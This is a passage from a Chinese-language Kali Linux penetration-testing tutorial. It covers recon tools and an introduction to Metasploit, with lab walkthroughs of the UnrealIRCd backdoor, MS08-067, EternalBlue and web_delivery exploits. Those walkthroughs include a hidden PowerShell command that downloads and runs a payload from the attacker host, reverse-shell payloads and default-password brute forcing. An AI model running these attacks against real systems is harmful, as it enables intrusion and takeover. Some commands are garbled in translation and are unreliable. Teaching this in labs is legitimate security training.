基本用法：运行 DMitry，包含任何你需要的开关并提供目标地址。例如，要查找子域名：输入; dmitry -s <Target Website>":

```
rootkali:~# # dmitry -s microsoft.com
Deepmagic Information Gathering Tool
"There are some deep magic going on"

HostIP:23.96.52.53
Hostname:microsoft.com
---------------------------
Gathered Subdomain information for microsoft.com
Searching Google.com:80...
Hostname:www.microsoft.com
HostIP:104.16.92.218
Hostname:support.microsoft.com
HostIP:184.50.218.21
Hostname:alogs.microsoft.com
HostIP:23.96.115.47
Hostname:mdn.microsoft.com
HostIP:132.58.168.19
Hostname:windows.microsoft.com
HostIP:134.170.119
```

Sparta 是发现这些设备的快速简便方法。我强烈建议企业安全团队（即使是小型企业和家庭用户）在 Shodan 中搜索他们的 IP 空间，以查看有哪些系统在网络上公开可用。

## Sparta

- 1. 在 Kali 中，从“01 - 信息收集 (Information Gathering)”菜单启动 Sparta。
- 2. 接下来，输入目标的 IP 地址。
- 3. 点击“加入范围 (Add to scope)”。
- 4. Sparta 自动开始扫描。
- 5. 点击“地址 (Address)”标签卡查看发现的主机。
- 6. 点击“服务 (Services)”标签卡查看开放端口。
- 7. 点击“工具 (Tools)”标签卡查看扫描。
- 8. 点击“结果 (Results)”标签卡查看结果。

Sparta 还为渗透测试提供了一个 GUI 界面，让初学者更容易上手。

| OS | Host | Port | Protocol | Name |
| --- | --- | --- | --- | --- |
| 192.168.1.68 | 21 | tcp | open | ftpd | 2.3 |
| 192.168.1.68 | 22 | tcp | open | OpenSSH | 7.4p1-Ubuntu |
| 192.168.1.68 | 23 | tcp | open | telnet |
| 192.168.1.68 | 25 | tcp | open | smtp | Postfix smtpd |
| 192.168.1.68 | 53 | tcp | open | domain | ISC BIND 9.4.2 |
| 192.168.1.68 | 80 | tcp | open | http | Apache/2.2.8 (Ubuntu) |
| 192.168.1.68 | 111 | tcp | open | rbind | 2 (100000) |
| 192.168.1.68 | 137 | udp | open | netbis-ms | Microsoft Windows-ss (workgroup) |
| 192.168.1.68 | 139 | tcp | open | netbis-sm | Samba smbt 3.X workgroup) |

注意返回的信息在屏幕两侧都整齐地分类。如果你点击左侧的“服务 (Services)”，可以找到检测到的开放服务的完整列表。如果你点击“工具 (Tools)”，将看到屏幕工具的结果。

基本上，所有这些信息都在屏幕右侧以命名的标签页的形式显示，方便查看。尽管花时间查看这些信息，它们非常有意思。如果这是一个我们要进行安全测试的系统，我们将很快地发现它有许多漏洞。Sparta 更进了一，会检查标准的用户名和密码。

例如，FTP 密码：

| Hosts | Services | Tools | | |
| --- | --- | --- | --- | --- |
| Tool | | | 16:36:41 | |
| FTP-default | 192.168.1.68 | 21/tcp | | [DATA] max 10 tasks per 1, overall 64 tasks, 10 login tries per port |
| | 192.168.1.68 | 2121/tcp | [DATA] attacking service font on port 21 |
| mysql-default | | | 21[(/ftp)] host 192.168.1.68 | Use the password |
| nikto | | | [STATUS] attack finished for 192.168.1.68 (valid pair found) |
| postgres-default | | | 1 of 1 task successfully |
| smtp-enum-vrfy | | | completed, 1 valid password found Hydra (http://www.thc.org/thc-hydra) finished at 2016-01-13 16:36:41 |




好了，我们的工作已经完成了。Sparta 扫描了我们的目标，列举了服务，并给了我们一个大量的漏洞列表，甚至是系统使用的几个默认密码。记住，我们的目标是一个故意留漏洞的系统，如果它在现实生活中也是这样就好了！疯狂的是，有时确实如此。人们在保护系统方面变得越来越了，但你仍然可以在网上找到完全没有防护的系统。

## Netdiscover

**工具作者：** Jaime Penalba
**工具网站：** http://ngeneration.com/~jaime/netdiscover/

Netdiscover 是一种主动/被动侦察工具，用于发现网络上的系统。它也可以从终端提示符或菜单系统运行：

```
root@kali:~# netdiscover -h
Netdiscover 0.3-pre-beta7 [主动/被动 arp 侦察工具]
Written by: Jaime Penalba [jaimepena@gmail.com]
Usage: netdiscover [-d device] [-r range] [-l file] [-p] [-m file] [-s time]
-c count [-f] [-d] [-s]
-d device: 你的设备
-r range: 扫描给定范围而不是自动扫描。192.168.0/24,16,/8
-l file: 扫描给定文件中包含的范围列表
-p passive mode: 被动模式：什么都不做，仅嗅探
```

这是一个较旧的工具，但在发现网络上哪些可用主机方面仍然运行良好。

**基本用法：** Netdiscover 扫描网络寻找设备并显示它们。要扫描本地以找到哪些可发现的系统：

在终端中直接输入："netdiscover"

你可以使用 "-r" 选项扫描特定的网络范围。它也可以使用 "-P" 以隐身“被动”模式运行，它不发送任何数据，只嗅探流量。

## Zenmap

工具作者：Insecure.Com LLC
工具网站：https://nmap.org/zenmap/

Zenmap 扫描系统的端口和状态信息。它是广受欢迎的 Nmap 命令的官方图形界面版本。如果你不熟悉 Nmap，那么 Zenmap 是一个非常好的起点。与之前的命令一样，Zenmap 可以从菜单或命令行启动。

一旦启动，你将看到以下屏幕：

填入目标 IP 地址（使用你实验室机器之一的 IP 地址），并从 Profile 下拉框中选择你想要执行的扫描类型。Zenmap 将在命令框中显示生成的 Nmap 命令开关。然后只需点击“Scan”（扫描）按钮即可运行命令：

如上所示，Nmap 命令状态显示在 Nmap Output 窗口中。可以通过点击标签卡查看其他信息，例如“Ports/Hosts”标签卡：

或“Host Details”（主机详细信息）窗口：

有关 Zenmap 的更多信息，请查看 Zenmap 用户指南：
https://nmap.org/book/zenmap.html

花些时间尝试 Zenmap 的不同功能。学习 Nmap。Nmap 是计算机安全领域的必用工具，因此它也是一个值得了解的工具。我在我的第二本 Kali 教程《Intermediate Security Testing with Kali Linux 2》中对其进行了广泛介绍。

## 结论

在这个工具概览章节中，我们涵盖了几个可以在 Kali 中用于侦察或目标枚举的额外程序。在移动到书的攻击部分之前，最好花时间掌握本节所涵盖的所有工具的实用知识。正如孙子所说：“知彼知己”，尽可能获取关于目标的知识（物理和电子方面）始终是一个良好的策略。通过这样做，你能够更好地规划你的攻击策略。

## 资源

- Kali 工具列表 - http://tools.kali.org/tools-listing

## Metasploit

# 第 7 章
## Metasploit 介绍

我们将从学习 Metasploit 框架开始我们的旅程。Metasploit (Metasploit Pro) 是一个非常全面的框架。Metasploit (MSF) 是用于漏洞测试的平台。它加载了成千上万的漏洞、数百个利用负载。

在本章中，我们将介绍使用 Metasploit 的基础。在后续章节中，我们将深入探讨如何使用 Metasploit。本章更多是对是对 Metasploit 流程的介绍。如果你已经熟悉使用 Metasploit，可以跳过本章或作为复习。

## 更新 Metasploit

通常要更新 Metasploit，只需运行“msfupdate”，但由于 Kali 更新到了“Rolling”版本，Metasploit 更新应该与之保持同步。

## Metasploit 概述

你可以通过两种不同的方式启动 Metasploit，从菜单或终端提示符。

或者直接在终端输入“msconsole”

但最简单的方法是点击启动栏上的 Metasploit 按钮：

从启动栏启动 MSF 可以确保数据库服务器正在运行并在需要时创建必要的数据库。然后启动 Metasploit。一旦 Metasploit 加载，你将看到标题屏幕并获得 **"msf >"** 提示符：

要在记事本中记录？让 Metasploit Pro 跟踪你的进度和发现，更多信息见 http://rapid7.com/metasploit

```
metasploit v4.11.0 .
- 88 exploits - 259 post
- 437 payloads - 38 encoders - 8 nodes
- 免费试用版：http://r.co/trymd
```

msf > 注意 提示符上面的“Missile Command” banner。Metasploit 包含了这些酷的屏幕，启动时随机显示一个。你可以通过输入“banner”查看不同的显示

```
msf > banner
```

Metasploit 包含了这些酷的屏幕，启动时随机显示一个。你可以通过输入“banner”查看不同的显示。如果你从未用过，Metasploit 可能会有点困惑，但一旦你习惯了，你就可以它做一些神奇的事情。

基本上，使用 Metasploit 攻击目标通常涉及以下步骤：

- 选择漏洞 (Exploit)
- 设置漏洞选项
- 选择利用负载 (Payload)
- 设置利用负载选项
- 运行漏洞
- 连接到系统
- 执行后渗透 (Post Exploitation)

下面的截图显示了一个示例，但不要担心，我们将在以后更详细地介绍该过程。

### 1 - 选择漏洞 (Exploit)

我们需要做的第一件事是选择一个要使用的漏洞。Metasploit 包含 1700 个漏洞，并经常添加新的。如果你想查看所有的漏洞，只需在 msf 提示符下输入 "show exploits"：

```
msf > show exploits
```

你也可以使用“search”命令。





注意：

如果你看到类似“!] Database not connected or cache not built, using slow search”的错误，你只需要在运行 msfconsole 之前启动 PostgreSQL 数据库（尽管不运行它搜索功能也能工作，只是速度会慢一些）。

要自动启动数据库，只需通过快速启动菜单中的 Metasploit 按钮启动 Metasploit，或者在终端中输入命令：

- service postgresql start
- msfdb init
- msfconsole

Metasploit 允许你通过多种方式搜索漏洞，按平台、甚至通过 CVE（常见漏洞与披露）和 bugtrack 编号。

输入 **"help search"** 查看所有选项：

```
msf > help search
Usage: search [keywords]

Keywords:
app : 客户端或服务器攻击模块
author : 由此作者编写的模块
bid : 与 Bugtraq ID 匹配的模块
cve : 与 CVE ID 匹配的模块
edb : 与 Exploit-DB ID 匹配的模块
name : 与描述名称匹配的模块
osvdb : 与 09V08 ID 匹配的模块
platform : 影响此平台的模块
ref : 与 ref 匹配的模块
type : 特定类型的模块（exploit, auxiliary, 或 post）

Examples:
search cve:2009 type:exploit app:client
```

要按名称搜索，输入 search 后加上你想搜索的文本。例如，查看 Metasploit 是否有微软安全公告 MS13-069 漏洞的利用程序：

输入 "search MS15-134"，

```
msf > search ms15-134
Matching Modules
=================
Name                    Disclosure Date Rank Description
---------------- ---- ---- -----------
auxiliary/server/ms15_134 mcl_leak 2015-02-08 normal MS15-134 Windows Media Center mcl Information Disclosure
``````

查看特定的 CVE ID 编号：

```
msf > search cve:2015-5119
Matching Modules
=================
Name                    Disclosure Date Rank
---------------- ---- ---- -----------
exploit/multi/browser/adobe_flash_hacking_uaf 2015-07-06 great
```

查看某年份的所有 CVE ID：

```
msf > search cve:2018
Matching Modules
=================
Name                    Disclosure
---------------- -----
auxiliary/admin/gitstack_rest      2018-01-15
auxiliary/dos/flexense_http_server_dos 2018-03-09
auxiliary/dos/webkitplus           2018-06-03
auxiliary/dos/tcp/clymore_dos       2018-02-06
auxiliary/fileformat/badpdf
```

或者直接使用程序名称查看特定程序的利用程序信息。例如，让我们来看 Unreal IRC 后门利用程序。

输入 "search unreal":

```
msf > search unreal
Matching Modules
=================
Name                    Disclosure Date Rank
---------------- ---- ---- -----------
exploit/linux/games/ut2004_secure 2004-06-18 good
exploit/unix/irc/unreal_ircd_3281_backdoor 2010-06-12 excellent
exploit/windows/games/ut2004_secure 2004-06-18 good
```

“Unreal irc backdoor”看起来很有趣，它甚至被评为“excellent”（优秀）。当你看到想要进一步了解的利用程序时，只需复制完整路径名称并使用 "info" 命令：

输入 "info exploit/unix/irc/unreal_ircd_3281_backdoor"

这将显示该利用程序的完整信息界面：

```
msf > info exploit/unix/irc/unreal_ircd_3281_backdoor
Name: UnrealIRCD 3.2.8.1 Backdoor Command Execution
Module: exploit/unix/irc/unreal_ircd_3281_backdoor
Platform: Unix
Arch: cmd
Privileged: No
License: Metasploit Framework (BSD)
Rank: Excellent
Disclosed: 2010-06-12

Provided by:
hdm <x@hdm.io>

Available targets:
Id Name
-- -----
0 Automatic Target
```

信息界面显示了作者名称、要概述以及可以设置的基本选项，以及该利用程序的描述和安全公告引用。如上面的图片所示，我们可以为此利用程序设置几个选项，这将引导我们进入下一个章节。

在设置利用程序选项之前，我们需要“使用”（use）该利用程序。一旦确定了我们想要的的利用程序，只需运行带有利用程序名称的 "use" 命令。同样，在这里复制并粘贴利用程序路径和名称也非常有效：

输入 "use exploit/unix/irc/unreal_ircd_3281_backdoor"

```
msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf exploit(Unreal_ircd_3281_backdoor)
```

注意 msf 提示符发生了变化，现在包含了利用程序模块名称。好了，我们现在正在使用利用程序，那么如何设置选项呢？

## 2 - 设置利用程序选项

在 Metasploit 中设置选项非常简单，使用 "set" 命令后跟变量名，然后是值：

set <Variable Name> <Value>

要查看可以设置哪些变量，使用 "show options" 命令：

```
msf exploit(unreal_ircd_3281_backdoor) > show options
Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):
Name        Current Setting Required
------        ---------------- ----------------
RHOST               yes            The target address
RPORT       6667        yes            The target port

Exploit target:
Id          Name
--          ----------------
0           Automatic Target
msf exploit(unreal_ircd_3281_backdoor) > ```

该利用程序使用了变量 RHOST 和 RPORT。RHOST 是我们正在攻击的远程主机，RPORT 是远程端口。

注意：
LHOST = 本地主机，或者我们的 Kali 系统
RHOST = 远程主机，或者我们的目标系统
LPORT = 我们在 Kali 系统上使用的端口
RPORT = 我们在目标系统上攻击的端口

让我们继续使用 set 命令设置 RHOST。如果目标系统的 IP 地址是 192.168.1.68（Metasploit VM），则使用下面的命令：

```
msf exploit(unreal_ircd_3281_backdoor) > set RHOST 192.168.1.68
RHOST => 192.168.1.68
```

如果我们再次运行 "show options" 命令，可以看到变量已经设置好了：

| Name | Current Setting | Required | Description |
|---|---|---|---|
| RHOST | 192.168.1.68 | yes | The target address |
| RPORT | 6667 | yes | The target port |

在这个利用程序中真正需要设置的所有内容。现在输入 "exploit" 执行：

```
msf exploit(unreal_ircd_3281_backdoor) > exploit
[*] Started TCP handler on 192.168.1.39:4444
[*] Connected to 192.168.1.68:6667...
[*] Metasploitable: Looking up your hostname...
[*] IP address installed
[*] Sending backdoor command.
[*] Accepted the first connection.
[*] Accepted the second connection...
[*] Command: echo pfimeYCUUJX
[*] Writing to socket
[*] Writing to socket
[*] Reading from socket...
[*] Reading from socket
[*] Received: pfimeYCUUJX
[*] Matching...
[*] Input.
[*] Command session 1 opened (192.168.1.39:4444 -> 192.168.1.68:43573) at 2016-02-19 09:18:44
```

我们获得了远程 shell！注意除了光标外没有提示符，但我们有一个目标系统的 Linux shell。如果输入 *whoami*，它返回 *root*，如果输入 `pwd`，它返回 `/etc/unreal`，如下所示：

```
whoami
root
pwd
/etc/unreal
```

按下 **Ctrl-C** 退出会话。你可以输入 "back" 退出当前模块并返回主 msf 提示符。

如果你感到迷茫，不要慌，稍后的章节会详细介绍。我只是想介绍在 Metasploit 中选择和使用基础利用程序的过程。

## 多目标类型

Unreal 后门是一个相当容易使用的利用程序。某些利用程序有你需要设置的多个变量，它们可能还有可以配置的可选变量。当你使用 Metasploit 时，你会发现某些利用程序有多个可以攻击的目标类型，必须设置精确的目标才能让利用程序正常工作。

要查看目标类型，"show targets"：

```
msf exploit(unreal_ircd_3281_backdoor) > show targets
Exploit targets:
Id Name
---
0 Automatic Target
```

在我们使用的利用程序中，目标是自动的，所以我们不需要设置它。但在其他程序中，有许多运行不同操作系统的目标，我们需要选择正确的目标以便使用正确的利用代码。

## 在 Windows XP 上获取远程 shell

我们简要看了一个 Linux 利用程序，现在让我们来一堂简短的历史课。现在没有人应该在他们的网络上运行任何 Windows XP 系统（尽管他们仍在运行），让我们花几分钟看看最流行的 Windows XP 利用程序之一，“ms08-067”。如果你没有目标系统，接下来我们将使用 Windows 7 虚拟机作为目标，只需阅读本节即可。

1. 简单的启动利用程序：
msf > exploit/windows/smb/ms08_067_netapi
msf exploit(windows/smb/ms08_067_netapi)

2. 现在输入 "show options"：
msf exploit(windows/smb/ms08_067_netapi) > show options
Module options (exploit/windows/smb/ms08_067_netapi):
Name Current Setting Required Description
--- ---------------- ----- -----------------
RHOST yes The target address
RPORT 445 yes Set the SMB service
SMBPIPE BROWSER yes The pipe name to use
Exploit target:
Id Name
---
0 Automatic Targeting
msf exploit(windows/smb/ms08_067_netapi) > _

3. 如果我们要设置特定的目标类型，"show targets"：



# 攻击目标：

| Id | 名称 |
|---|---|
| 0 | 自动目标 |
| 1 | Windows 2000 通用 |
| 2 | Windows XP SP0/SP1 通用 |
| 3 | Windows 2003 SP0 通用 |
| 4 | Windows XP SP2 英语 (始终开启 NX) |
| 5 | Windows XP SP2 英语 (NX) |
| 6 | Windows XP SP3 英语 (始终开启 NX) |
| 7 | Windows XP SP3 英语 (NX) |
| 8 | Windows XP SP2 阿拉语 (NX) |
| 9 | Windows XP SP2 繁体中文 - 台湾 |
| 10 | Windows XP SP2 简体中文 - (NX) |
| 11 | Windows XP SP2 繁体中文 - (NX) |
| 12 | Windows XP SP2 捷克语 (NX) |
| 13 | Windows XP SP2 丹麦语 (NX) |
| 14 | Windows XP SP2 德语 (NX) |

注意，此漏洞有许多 XP 目标选项。我针对的 XP 系统运行的是 Windows XP SP1，列为目标 2。

- 4. 输入 "set target <ID#>" 来设置目标 ID。
`msf exploit(ms008_067 netapi) > set target 2 target => 2`

- 5. 再次输入 "show options" 将显示我们确实已经设置了目标值：

攻击目标：
| Id | 名称 |
|---|---|
| 2 | Windows XP SP0/SP1 通用 |

最后，尽管在基础漏洞利用中没有用到，但如果我们需要，我们也可以设置高级选项。

要显示高级选项，只需输入 "show advanced"

```
msf exploit(ms08_067_netapi) > show advanced
Module advanced options (exploit/windows/smb/ms08_067_netapi):
  Name              : CHOST
  Current Setting:
  Description       : The local client address
  Name              : CPORT
  Current Setting:
  Description       : The local client port
  Name              : ConnectTimeout
  Current Setting: 10
  Description       : Maximum number of seconds to establish a TCP connection
  Name              : ContextInformationFile
  Current Setting:
  Description       : The information file that contains context information
```

我们现在已经了解了如何选择漏洞以及如何设置选项。对于大多数漏洞，我们还需要设置载荷（payload）。

## 选择载荷

如果对被攻击的机器什么也做不了，利用它的意义何？载荷允许你对被攻击的系统执行功能性操作。它们还提供了与目标进行双向连接的不同方式。Metasploit 带有许多不同的载荷。

输入 "show payloads"：

```
msf exploit(ms08_067_netapi) > show payloads
Compatible Payloads
=================
Name
---
---
gener/custom
gener/debug_trap
gener/shell_bind_tcp
gener/shell_reverse_tcp
gener/tight_loop
windows/addduaser
windows/dllinject/bind_hidden_ipknock_tcp
ock TCP Stager
windows/dllinject/bind_hidden_tcp
Stager
windows/dllinject/bind_ipv6_tcp
tager (Windows x86)
windows/dllinject/bind_ipv6_tcp uuid
```

或者你可以输入 “set payload” 并按两次 Tab 键。这将提示 Metasploit 询问你是否想查看所有可用的载荷：

```
msf exploit(ms8_067_metasploit!) > set payload
Display all 141 possibilities? (y n)
```

如果你输入 “y”，Metasploit 将列出所有可用的载荷，有很多可能性！

## 载荷布局

大多数载荷按照“操作系统/Shell 类型”的格式排列，如下所示：

- payload/osx/x86/shell_reverse_tcp
- payload/linux/x64/shell_reverse_tcp
- payload/windows/shell_reverse_tcp
- payload/windows/meterpreter/reverse_tcp

只需为你的目标选择操作系统并挑选你想要的载荷。最流行的载荷类型是 shell，无论是普通的远程 shell 还是 Meterpreter shell。如果我们只是想要一个远程终端来远程运行命令，请使用标准 shell。如果你想获得操纵会话并运行扩展命令的能力，那么你赢得 Meterpreter shell（我们将在下一章中详细讨论）。

载荷返回攻击系统的通信方式有多种类型。我通常倾向于使用 reverse_tcp shell，因为一旦它们在目标上执行，它们就会告诉攻击机器连接到我们的 Kali 系统。这样做的好处是，由于受害者机器技术上是“发起”外部连接，它通常不会被防火墙拦截。而从外部尝试建立的连接很可能会拦截。

一旦知道了想要使用哪个载荷，我们就使用 “set” 命令进行设置。

- 6. 我将为 Windows 系统使用 Meterpreter shell 并让它通过 reverse_tcp 回连，如下所示：

```
msf exploit(ms8_067_metasploit!) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
```

现在载荷已选择，所有我们需要设置的选项也设置完毕。

## 设置选项

RHOST 变量是目标 IP 地址。LHOST 是我们机器的 IP 地址。LPORT 是我们监听的端口。

- 7. 输入 "show options" 查看我们需要的内容：

```
msf exploit(ms08_067_netapi) > show options
Module options (exploit/windows/smb/ms08_067_netapi):
Name              Current Setting Description
--------------------------------------------------------------------------------
RHOST           yes       The target address
RPORT           445             Set the SMB port
SMBPIPE         yes       The pipe name to use
EXITFUNC        thread          Exit technique
```

如所示，看来我忘记设置目标 (RHOST) IP 地址了！RHOST 在之前的示例中设置过，但当我切换漏洞时，没有重新设置远程主机。当你运行许多漏洞、测试不同的系统时，可能会发生这种情况，所以最好检查你的。

- 8. 将 RHOST 变量设置为目标 Windows XP。

```
msf exploit(ms08_067_netapi) > set RHOST 192.168.1.20
RHOST => 192.168.1.20
```

LHOST 是我们机器的 IP 地址。LPORT 是我们监听的端口。

- 9. 最后检查一次选项，一切正常：载荷已选择，所有我们需要设置的选项也设置完毕。现在是运行漏洞的时候了。

- 10. 要运行漏洞，只需输入 “exploit”

漏洞随后运行，成功后，载荷执行，我们获得了一个远程连接。

## 连接到远程会话

一旦成功利用漏洞，我们就可以查看创建的任何远程会话。如果漏洞无效，你将返回 Metasploit 提示符。要检查创建了哪些会话，输入 “sessions” 命令。任何创建的会话都会显示目标系统的 IP 地址、计算机名称和用户名：





## 活跃会话

| Id | 类型 | 信息 | 连接 |
|---|---|---|---|
| 1 | meterpreter x86/win32 | FRE-PW3VOENN91\Administrator @ FRE-PW3VOENN91 | 192.168.1.39:4444 (192.168.1.20) |

我们现在使用 **sessions -i <ID#>** 命令交互式连接到会话。当我们连接到会话时，提示符将变为 **meterpreter** 提示符。我们下一章更深入地介绍 Meterpreter shell。但现在，如果我们只输入 "shell" 命令，就可以看到我们确实拥有一个 Windows XP 系统的远程 shell：

```
* Starting interaction with 1...
meter > shell
Process 3032 created.
Channel 1 created.
Microsoft Windows XP (Version 5.1.2600)
(C) Copyright ©1985-2001 Microsoft Corp.
C:\Documents and Settings\Administrator\Desktop\>
```

既然我们已经完成了使用 Windows XP 漏洞利用的演示，让我们来实际操作一下，看看如何获取 Windows 7 的 shell。

## 在 Windows 7 机器上获取远程 shell

是时候把新学的技能付诸实践了，这将是一个完整的实操课程。别担心，这是一个非常快速且简单的漏洞利用。在本节中，我们将学习如何使用 Web Delivery 漏洞利用模块从 Windows 系统快速获取 Meterpreter 反反射 shell。我们将使用 Windows 7 虚拟机作为目标。如果 Windows 7 虚拟机没有运行，请启动它并登录。

让我们开始吧！

- 如果需要，输入 "back" 返回初始的 msf 提示符：
```
msf exploit(ms08_067_netapi) > back
msf >
```
现在输入：
```
use exploit/multi/script/web_delivery
set LHOST 192.168.1.39
set LPORT 4444
```
接下来输入 "show targets":

```
msf use exploit/multi/script/web_delivery
msf exploit(multi/script/web_delivery) > set LHOST 192.168.1.39
LHOST => 192.168.1.39
msf exploit(multi/script/web_delivery) > set LPORT 4444
LPORT >> 4444
msf exploit(multi/script/web_delivery) > show targets
```

漏洞利用目标：

| Id | 名称 |
|---|---|
| 0 | Python |
| 1 | PHP |
| 2 | PSH |
| 3 | Regsvr32 |
| 4 | PSH (Binary) |

```
msf exploit(multi/script/web_delivery) > 
```

注意我们有几个选项，包括 Python、PHP 和 PSH (PowerShell)。我们可以通过选择正确的目标使用 Web Delivery 漏洞利用来测试 Windows、Linux 和 Mac 目标。我们将攻击一个 Windows 系统，因此将使用选项 2，PSH (PowerShell)。

- 4. 输入 "set target 2"
- 5. 设置有效负载，“set payload windows/meterpreter/reverse_tcp"
- 6. 你可以使用 "show options" 检查一切是否正常：

Payload 选项 (windows/meterpreter/reverse_tcp):

| 名称 | 当前设置 | 需要 | 描述 |
|---|---|---|---|
| EXITFUNC | - process | yes | 退出技术 (接受): |
| LHOST | 192.168.1.39 | yes | 监听地址 |
| LPORT | 4444 | yes | 监听端口 |

漏洞利用目标：

| Id | 名称 |
|---|---|
| 2 | PSH |

现在输入 "exploit":

```
msf exploit(multi/script/web_delivery) > exploit
[*] exploit running as background job 0.

[+] Started reverse TCP handler on 192.168.1.39:4444
msf exploit(multi/script/web_delivery) > [*] Using URL: http://0.0.0.0:80
65jIBldwf4

[+] Local IP: http://192.168.1.39:8080/vza605j1Bldwf4

[+] Server started.

[+] Running the following command on the target machine:
powershell.exe -nop -w hidden -c $new-object net.client;$I.Proxy=$(New-Object System.GetSystemWebProxy());$I.Proxy.Credentials=[Net.Credential]$credentials;$IEX:downloadString('http://192.168.1.39:8080/vza605j1Bldwf4')
```

这在我们系统上启动了一个生成的监听器，并等待传入连接。我们需要做的就是在目标系统上运行生成的 PowerShell 命令。

- 8. 在 Windows 7 上，打开命令提示符，并执行 Metasploit 提供的 PowerShell 命令。

```
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.
C:\Users\Dan>powershell.exe -nop -w hidden -c $new-object net.client;$I.Proxy=$(New-Object System.GetSystemWebProxy());$I.Proxy.Credentials=[Net.Credential]::DefaultCredentials;$IEX:downloadString('http://192.168.1.39:8080/vza605j1Bldwf4')
```

几秒后你应该看到：

```
[+] Sending stage (17979 bytes) to 192.168.1.93
[*] session 1 opened (192.168.1.39:4444 -> 192.168.1.93:49168)
```

有一个 Meterpreter 会话！

- 9. 现在输入 "sessions" 列出活跃会话。
- 10. 使用 "sessions -i 1" 连接它：

```
sessions
Active sessions
Id Name Connection
-----------------------------
1 meterpreter x86/windows 192.168.1.39
msf exploit(multi/script/web_delivery) > sessions -i 1
[*] Starting interaction with 1...
meterpreter >
```

我们现在拥有了一个目标的 Meterpreter shell：

```
meterpreter > ls
Listing: C:\Users\Dan
```

| 模式 | 大小 | 类型 | 最后修改 | 名称 |
|---|---|---|---|---|
| drwxr-xr-x | 0 | dir | 2016-02-09 16:13 | oracle_jre |
| drwxr-xr-x | 0 | dir | 2015-01-06 09:59 | AppData |
| drwxr-xr-x | 0 | dir | 2015-01-06 09:59 | Application Data |
| drwxr-xr-x | 0 | dir | 2015-03-26 23:24 | Contacts |
| drwxr-xr-x | 0 | dir | 2015-01-06 09:59 | Cookies |
| drwxr-xr-x | 0 | dir | 2016-02-13 11:56 | Desktop |
| drwxr-xr-x | 0 | dir | 2015-01-11 11:11 | Documents |
| drwxr-xr-x | 0 | dir | 2016-02-09 16:22 | Downloads |
| drwxr-xr-x | 0 | dir | 2015-01-06 10:01 | Favorites |
| drwxr-xr-x | 0 | dir | 2015-01-06 10:01 | Links |
| drwxr-xr-x | 0 | dir | 2015-01-06 09:59 | Local Settings |
| drwxr-xr-x | 0 | dir | 2015-01-06 10:01 | Music |
| drwxr-xr-x | 0 | dir | 2015-01-06 09:59 | My Documents |

> **注意：**
> 在写作期间，PowerShell Web Delivery 模块适用于完全更新的 Windows 7 系统和 Windows 10。

恭喜，你创建了第一个 Windows 7 Meterpreter！我们将深入深入探讨 Meterpreter shell 的功能。你可以输入 "help" 来查看可用命令。或者你可以输入 "shell" 进入远程 shell：

```
meterpreter > shell
Process 2152 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.
C:\Users\Dan->
```

Webdelivery 是我喜欢的 Metasploit 漏洞利用之一，因为它支持 Python、PHP 和 PowerShell 等多种目标语言。我们整本书都会使用 Webdelivery 漏洞，因此必须熟悉它。完成后，输入 "exit" 退出远程 shell，再次输入 "exit" 退出活跃会话，最后退出 Metasploit。此外，重启你的 Windows 7 虚拟机。

## EternalBlue

在我们进入下一章之前，我想向你们展示另一件事。ms08_067_netapi 曾 Windows XP 的常用漏洞利用，MS17_010_EternalBlue 自此已添加到 Metasplo Framework。EternalBlue 针对未打补丁的任何 Windows 7 或 Server 2008 的 SMB 版本 1 漏洞。EternalBlue 适用于 64 位目标，由于我们有 32 位版本，这将不起作用。

## EternalBlue 漏洞利用演示

和既往一样，Metasploit 的第一步是使用 "use" 命令选择一个要使用的漏洞。一旦选择了漏洞，你就可以使用 "show options" 查看使用了哪些变量以及可能需要设置什么，见下：

```
msf > exploit/windows/smb/ms17_010_eternalblue
msf exploit(windows/smb/ms17_010_eternalblue) > show options
```





```bash
msf exploit(windows/smb/ms17_01_eternalblue) > RHOST 192.168.1.179
RHOST => 192.168.1.179
msf exploit(windows/smb/ms17_01_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
payload = windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_01_eternalblue) > set LHOST 192.168.1.108
LHOST => 192.168.1.108
msf exploit(windows/smb/ms17_01_eternalblue) > set LPORT 4444
LPORT = 4444
msf exploit(windows/smb/ms17_01_eternalblue) > exploit
```

该漏洞利用针对脆弱的 Windows Server 2008 系统运行，并如下：

- [+] - 正在发送 SMB 缓冲区
- 192.168.1.175 - 关闭 SMB 连接，在 SMBv2 邻处创建空闲
- 192.168.1.175 - 正在发送最后的 SMB 缓冲区。
- 192.168.1.175 - 正在发送漏洞包的最后一个碎片！
- 192.168.1.175 - 收到来自漏洞包的响应！
- 192.168.1.175 - [真的，漏洞利用成功完成 (0x0C00000D)]
- 192.168.1.175 - 向受损坏的连接发送 egg。
- 192.168.1.175 - 触发损坏缓冲区的释放。
- 发送耗时：0:00:06 秒
- Meterpreter 会话 1 已打开 (192.168.1:4444) -> 192.168.1:54723) 时间为 2018-05-12 14:23:15
- 192.168.1.175 - Meterpreter 会话 1 已建立。
- 192.168.1.175 - ------------------------------------------------------

我们可以从下面的图中看到，我们已经成功获取了远程 shell：

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 5432 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
copyright (C) 2009 Microsoft Corporation. All rights reserved.
C:\Windows\system32>>
```

EternalBlue（永恒蓝）漏洞利用运行良好，遗憾的是，它已经被黑客在几次大型攻击中使用。这就是为什么保持系统更新并禁用不需要或过时的服务非常重要性。

## 结论

在对 Metasploit 的这段相当冗长的介绍中，我们涵盖了如何执行框架的一些基本功能，以便我们发现并利用漏洞。我们简要讨论了使用有效负载（payload）和设置必要的变量。我们还涵盖了如何使用强大的 Web Delivery 漏洞利用来在 Windows 7 系统上获取远程 shell。最后，我们看到了 EternalBlue 漏洞利用是如何针对 Windows Server 2008 系统运行的。

